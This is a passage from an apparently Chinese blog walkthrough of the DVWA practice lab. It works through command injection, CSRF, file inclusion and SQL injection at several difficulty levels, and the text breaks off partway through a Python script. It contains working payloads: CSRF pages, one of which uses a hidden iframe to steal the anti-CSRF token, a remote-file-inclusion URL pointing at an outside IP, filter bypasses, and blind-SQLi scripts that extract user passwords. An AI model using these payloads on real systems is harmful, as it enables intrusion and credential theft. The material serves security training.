class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(line)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;false&#x27;</span>)<br>b(<span class="hljs-string">&quot;D:/BrupSuite/mma/top1000.txt&quot;</span>)<br></code></pre></div></td></tr></table></figure><h1 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h1><p>命令执行</p><ol><li><p>设置为low、medium时使用|绕过即可如图</p><p><img src="https://img-blog.csdnimg.cn/20210706161900253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>high模式下查找源码如下</p></li></ol><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br><span class="hljs-comment">// Check Anti-CSRF token</span><br>checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><span class="hljs-comment">// Get input</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><span class="hljs-variable">$target</span> = stripslashes( <span class="hljs-variable">$target</span> );<br><br><span class="hljs-comment">// Split the IP into 4 octects</span><br><span class="hljs-variable">$octet</span> = explode( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><span class="hljs-comment">// Check IF each octet is an integer</span><br><span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;jinru&#x27;</span>;<br><span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br><span class="hljs-comment">// Determine OS and execute the ping command.</span><br><span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br><span class="hljs-comment">// Windows</span><br><span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// *nix</span><br><span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><br><span class="hljs-comment">// Feedback for the end user</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;weiru&#x27;</span>;<br><span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br><span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>将输入按照.分为数组，且数组中均为数字，且数组长度为4</p><p>暂时无法绕过</p><p>3.Impossible在 DVWA v1.9 之前，这个级别被称为“high”，查找到high模式后</p><p>查看源码如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = trim(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br></code></pre></div></td></tr></table></figure><p>其中|的过滤不够完善，之后更有空格，将空格去掉，即可进行命令操作</p><p>如图：</p><p><img src="https://img-blog.csdnimg.cn/20210706164731144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ol><li><p>设置low模式下，首先对内容抓包后发现只是一个请求，尝试直接将该请求嵌入界面后点击。编写代码如下：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>csrf练习<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.66.133/dvwa/vulnerabilities/csrf/&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password<span class="hljs-symbol">&amp;#95;</span>new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1234&quot;</span> /&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password<span class="hljs-symbol">&amp;#95;</span>conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1234&quot;</span> /&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span> /&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>点击后密码就被修改。</p><p>结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210706111806917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>设置medium模式下，查看源码后发现对来源的地址进行了检查，进行了内容的查找。进行抓包后修改referer即可修改成功。不清楚如何在只有html界面的情况下修改。根据网上信息，将文件名修改为127.0.0.1.html可以进行修改。由于源目录包含了127.0.0.1所以可以成功修改。</p></li><li><p>设置high模式下，此时发送的请求带有token，且服务器端也有token的检查。</p><p>此时需要结合xss攻击获取token后进行密码的修改。在查看csrf界面的源码后发现是设置在form中可以使用document.getElementsByName获取token的内容，此时在xss界面进入csrf界面并获取token等信息进行密码的修改</p><p>具体代码为应为：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript">  </span>&#123;</span><br><span class="javascript">      <span class="hljs-comment">// 设置获取token</span></span><br><span class="javascript">   <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><span class="javascript">  <span class="hljs-comment">// 提交</span></span><br><span class="javascript">  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit(); </span><br><span class="javascript">  &#125;</span><br><span class="javascript"></span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>但是由于长度限制和script的过滤我无法全部写入，只注入了获取token的内容</p><p>&lt;iframe src=”../csrf”onload=alert(frames[0].document.getElementsByName(‘user_token’)[0].value)&gt;</p><p>结果如图：</p><p><img src="https://img-blog.csdnimg.cn/2021070611183711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li></ol><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><ol><li><p>low 对文件进行包含发现</p><p>目标的目录结构如图所示</p><p><img src="https://img-blog.csdnimg.cn/20210705125325159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>此时尝试目录穿越读取文件</p><p>使用相应的协议读取php文件</p><p><img src="https://img-blog.csdnimg.cn/20210705125342234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>将读取的内容进行解码即可得到代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]; <span class="hljs-comment">//The page we wish to display </span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>当服务器的php配置中，选项allow_url_fopen on与allow_url_includeon为开启状态时，并且  magic_quotes_gpc = Off.服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>使用url进行远程包含 <a href="http://192.168.66.133/dvwa/vulnerabilities/fi/?page=http://121.196.162.32/a.txt">http://192.168.66.133/dvwa/vulnerabilities/fi/?page=http://121.196.162.32/a.txt</a></p></li><li><p>在medium模式下源码使用str_replace进行过滤，但是str_replace只是进行替换，进行双写即可绕过结果如图</p><p><img src="https://img-blog.csdnimg.cn/20210705140919848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>在high模式下使用fnmatch进行判断，其作用为：fnmatch函数检查page参数，要求page参数的开头必须是file，此时使用file协议进行绕过构造url page=file:///../1.txt</p><p><img src="https://img-blog.csdnimg.cn/20210705140932489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li></ol><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><ol><li><p>设置low模式下，进行手动注入尝试。首先尝试最常用的1’ or 1=1;#</p><p>发现注入点如图：</p><p><img src="https://img-blog.csdnimg.cn/20210705151055735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>进一步使用order by 进行输出字段的尝试，当order by 3时出错，说明有字段数为2</p><p>下一步进行数据库的基本查询sql：0‘ union select database(),user()</p><p>结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210705151131651.png#pic_center"></p><p>此后对数据库内容进行查询，首先是表名，sql：0’ union select database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())#</p><p>结果如图:</p><p><img src="https://img-blog.csdnimg.cn/20210705151154661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>之后选取表进行列名的注入sql: 0’ union select database(),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’)#</p><p>结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210705151605887.png#pic_center"></p><p>最后进行表内容的注入sql:0’ union select database(),(select group_concat(user) from users);#</p><p>结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210705151614342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>设置medium模式下，对输入进行了限制，尝试通过bp抓包直接进行注入</p><p>抓包后修改内容进行基本注入，发现字符注入始终错误，尝试其他类型注入。</p><p>发现数值型注入可以得到回显，结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210705152411417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>之后按照low模式下的方法继续注入即可。</p></li><li><p>设置high模式下，对内容进行抓包后发现是post传输内容，sql：1’ or 1=1;#</p><p>方法与之前相似。</p></li></ol><h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><ol><li><p>设置low模式下，发现内容没有回显，只是显示id存在，经过初步判断可以得知为字符型注入。此时编写python脚本获取数据库长度及名称，代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">nr</span>(<span class="hljs-params">url,sql</span>):</span><br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>            url_q=url+<span class="hljs-string">&quot;/dvwa/vulnerabilities/sqli_blind/?id=&quot;</span>+sql.<span class="hljs-built_in">format</span>(i,j)+<span class="hljs-string">&quot;&amp;Submit=Submit&quot;</span><br>            <span class="hljs-comment"># print(url_q)</span><br>            r=requests.get(url=url_q,headers=header)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;User ID exists in the database&#x27;</span> <span class="hljs-keyword">in</span> r.text):<br>                flag+=j<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:%s&quot;</span>%(flag))<br>                <span class="hljs-keyword">break</span><br>header=&#123;<br><span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;security=low; PHPSESSID=06jsdi4p6auso911ivb42u2eg4&#x27;</span><br>&#125;<br>s=<span class="hljs-string">&quot;asdfghjklqwertyuiopzxcvbnm-+=,._1234567890&#125;&#123;&quot;</span><br><span class="hljs-comment"># 数据库名</span><br><span class="hljs-comment"># sql=&quot;0&#x27; or substr((select database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br><span class="hljs-comment">#表名</span><br><span class="hljs-comment">#　sql=&quot;0&#x27; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br><span class="hljs-comment">#字段名</span><br><span class="hljs-comment"># sql=&quot;0&#x27; or substr((seLEct group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br><span class="hljs-comment">#具体内容 concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)</span><br>sql=<span class="hljs-string">&quot;0&#x27; or substr((selEct group_concat(concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)) from users),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br>url=<span class="hljs-string">&quot;http://192.168.66.133/&quot;</span><br>nr(url,sql)<br><br></code></pre></div></td></tr></table></figure><p>最后得到结果如图：</p><ol><li><p>数据库名称：</p><p><img src="https://img-blog.csdnimg.cn/20210706131122158.png#pic_center"></p></li><li><p>数据库表：</p><p><img src="https://img-blog.csdnimg.cn/20210706131130377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>数据库表列名：</p><p><img src="https://img-blog.csdnimg.cn/20210706131130476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>具体内容：</p><p><img src="https://img-blog.csdnimg.cn/20210706131130473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li></ol></li><li><p>设置medium模式下，抓包后发现是利用post进行传输，且使用函数mysqli_real_escape_string对内容进行过滤，将代码修改如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">nr</span>(<span class="hljs-params">url,sql</span>):</span><br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>            url_q=url+<span class="hljs-string">&quot;/dvwa/vulnerabilities/sqli_blind/&quot;</span><br>            <span class="hljs-built_in">print</span>(url_q)<br>            data=&#123;<br>                <span class="hljs-string">&quot;id&quot;</span> : sql.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(j))),<br>                <span class="hljs-string">&#x27;Submit&#x27;</span>: <span class="hljs-string">&#x27;Submit&#x27;</span><br>            &#125;<br>            